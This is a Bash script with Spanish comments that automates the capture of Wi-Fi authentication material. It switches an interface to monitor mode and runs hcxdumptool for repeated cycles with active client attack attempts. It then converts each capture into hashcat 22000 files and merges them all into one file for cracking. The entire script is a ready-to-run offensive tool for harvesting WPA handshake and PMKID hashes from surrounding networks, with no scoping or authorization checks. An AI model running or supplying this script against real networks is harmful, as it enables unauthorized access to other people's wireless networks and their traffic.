#!/bin/bash

# CONFIGURACIÓN
INTERFACE="wlan1"
CAPTURE_DURATION=60      # Duración de cada escaneo en segundos
WAIT_DURATION=30         # Espera entre escaneos
CYCLES=5                 # Número de ciclos de escaneo
OUTPUT_DIR="$HOME/capturas_wifi"
BASE_DUMP_FILE="captura"
BASE_HASH_FILE="hashes"

mkdir -p "$OUTPUT_DIR"

stop_services() {
  echo "[*] Deteniendo servicios que pueden interferir..."
  sudo systemctl stop NetworkManager wpa_supplicant dhcpcd.service
}

start_services() {
  echo "[*] Reiniciando servicios de red..."
  sudo systemctl start NetworkManager wpa_supplicant dhcpcd.service
}

set_monitor_mode() {
  echo "[*] Poniendo interfaz $INTERFACE en modo monitor..."
  sudo ip link set "$INTERFACE" down
  sudo iw dev "$INTERFACE" set type monitor
  sudo ip link set "$INTERFACE" up
}

set_managed_mode() {
  echo "[*] Poniendo interfaz $INTERFACE en modo managed..."
  sudo ip link set "$INTERFACE" down
  sudo iw dev "$INTERFACE" set type managed
  sudo ip link set "$INTERFACE" up
}

for ((i=1; i<=CYCLES; i++)); do
  TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
  DUMP_FILE="${OUTPUT_DIR}/${BASE_DUMP_FILE}_${TIMESTAMP}.pcapng"
  HASH_FILE="${OUTPUT_DIR}/${BASE_HASH_FILE}_${TIMESTAMP}.22000"

  stop_services
  set_monitor_mode

  echo "[*] Ciclo $i/$CYCLES: Capturando durante $CAPTURE_DURATION segundos..."
  timeout $CAPTURE_DURATION sudo hcxdumptool -i "$INTERFACE" -w "$DUMP_FILE" -F --attemptclientmax=10

  set_managed_mode
  start_services

  echo "[*] Convirtiendo captura a formato hashcat..."
  hcxpcapngtool -o "$HASH_FILE" "$DUMP_FILE"

  echo "[+] Hash guardado en: $HASH_FILE"

  if [ "$i" -lt "$CYCLES" ]; then
    echo "[*] Esperando $WAIT_DURATION segundos antes del siguiente ciclo..."
    sleep $WAIT_DURATION
  fi
done

FINAL_HASH_FILE="${OUTPUT_DIR}/hashes_todo_unificado.22000"
echo "[*] Uniendo todos los archivos hash en $FINAL_HASH_FILE..."
cat "$OUTPUT_DIR"/hashes_*.22000 > "$FINAL_HASH_FILE"

echo "[✓] Todos los ciclos completados. Hashes unificados en: $FINAL_HASH_FILE"
